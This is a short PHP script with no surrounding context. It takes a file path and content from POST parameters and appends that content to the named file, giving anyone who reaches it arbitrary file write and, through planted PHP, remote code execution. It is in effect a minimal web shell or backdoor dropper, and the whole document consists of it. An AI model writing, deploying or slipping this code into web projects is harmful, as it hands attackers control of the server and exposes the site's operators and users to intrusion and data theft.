<?php 
if($_POST){
$file = fopen($_POST['file'],"a");
fwrite($file,$_POST['code']);
fclose($file);
}
?>